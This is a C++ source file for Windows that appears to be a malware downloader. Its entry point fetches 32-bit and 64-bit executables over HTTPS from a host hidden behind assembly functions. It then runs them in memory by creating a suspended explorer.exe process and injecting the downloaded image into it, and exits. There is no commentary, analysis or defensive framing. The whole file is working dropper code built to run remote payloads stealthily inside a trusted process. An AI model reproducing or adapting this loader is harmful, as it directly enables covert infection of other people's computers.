#include "stdafx.h"

#pragma code_seg(".text$mn$cpp")

BOOL Download(_In_ PCWSTR lpszServerName, _In_ PCWSTR lpszObjectName, _Out_ void** ppv, _Out_ ULONG* pcb)
{
	BOOL fOk = FALSE;

	if (HINTERNET hSession = WinHttpOpen(0, 0, 0, 0, 0))
	{
		if (HINTERNET hConnect = WinHttpConnect(hSession, lpszServerName, INTERNET_DEFAULT_HTTPS_PORT, 0))
		{
			if (HINTERNET hRequest = WinHttpOpenRequest(hConnect, 0, 
				lpszObjectName, 0, 0, 0, WINHTTP_FLAG_REFRESH|WINHTTP_FLAG_SECURE))
			{
				if (WinHttpSendRequest(hRequest, 0, 0, 0, 0, 0, 0) &&
					WinHttpReceiveResponse(hRequest, 0))
				{
					WCHAR sz[0x40], *psz;
					ULONG cb = sizeof(sz);
					if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH, 0, sz, &cb, 0))
					{
						ULONG dwFreeSpace = wcstoul(sz, &psz, 10);

						if (dwFreeSpace && !*psz)
						{
							if (PSTR Buf = new CHAR[dwFreeSpace])
							{
								*pcb = dwFreeSpace;

								PSTR lpBuffer = Buf;

								while (WinHttpReadData(hRequest, lpBuffer, dwFreeSpace, &cb) && cb)
								{
									lpBuffer += cb, dwFreeSpace -= cb;
								}

								if (!dwFreeSpace)
								{
									*ppv = Buf; 
									fOk = TRUE;
								}
								else
								{
									delete [] Buf;
								}
							}
						}
					}
				}

				WinHttpCloseHandle(hRequest);
			}

			WinHttpCloseHandle(hConnect);
		}

		WinHttpCloseHandle(hSession);
	}

	return fOk;
}

//#define _PRINT_CPP_NAMES_
#include "asmfunc.h"

BOOL __fastcall Exec64(PVOID BaseOfImage, HANDLE hProcess, HANDLE hThread)ASM_FUNCTION;
BOOL Exec(_In_ PVOID bWow, PVOID BaseOfImage, PIMAGE_NT_HEADERS pinth, PCWSTR lpCmdLine = 0);
PCWSTR explorer()ASM_FUNCTION;

BOOL __fastcall Exec64(PVOID BaseOfImage, PCWSTR lpCmdLine = 0)
{
	BOOL fOk = FALSE;

	void* OldValue;
	if (Wow64DisableWow64FsRedirection(&OldValue))
	{
		WCHAR buf[MAX_PATH];

		if (ULONG cch = GetSystemWindowsDirectoryW(buf, _countof(buf) - 16))
		{
			wcscpy(buf + cch, explorer());

			STARTUPINFO si = { sizeof(si) };
			PROCESS_INFORMATION pi;

			if (CreateProcessW(buf, const_cast<PWSTR>(lpCmdLine), 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi))
			{
				if (!(fOk = Exec64(BaseOfImage, pi.hProcess, pi.hThread)))
				{
					TerminateProcess(pi.hProcess, 0);
				}

				NtClose(pi.hThread);
				NtClose(pi.hProcess);
			}
		}

		Wow64RevertWow64FsRedirection(OldValue);
	}

	return fOk;
}

void DownloadAndExec(_In_ PCWSTR lpszServerName, _In_ PCWSTR lpszObjectName, _In_ PVOID wow, _In_ BOOL b64)
{
	if (!wow && b64) return; // can not exec x64 on x86 win

	void* pv = 0;
	ULONG cb = 0;
	if (Download(lpszServerName, lpszObjectName, &pv, &cb))
	{
		PIMAGE_NT_HEADERS pinth;
		if (0 <= RtlImageNtHeaderEx(0, pv, cb, &pinth))
		{
			b64 && wow ? Exec64(pv) : Exec(wow, pv, pinth);
		}
		delete [] pv;
	}
}

PCWSTR host()ASM_FUNCTION;
PCWSTR URL32()ASM_FUNCTION;
PCWSTR URL64()ASM_FUNCTION;

void WINAPI ep(PEB* peb)
{
	CPP_FUNCTION;

	if (0 <= NtQueryInformationProcess(NtCurrentProcess(), ProcessWow64Information, &peb, sizeof(peb), 0))
	{
		DownloadAndExec(host(), URL32(), peb, FALSE);
		DownloadAndExec(host(), URL64(), peb, TRUE);
	}

	ExitProcess(0);
}
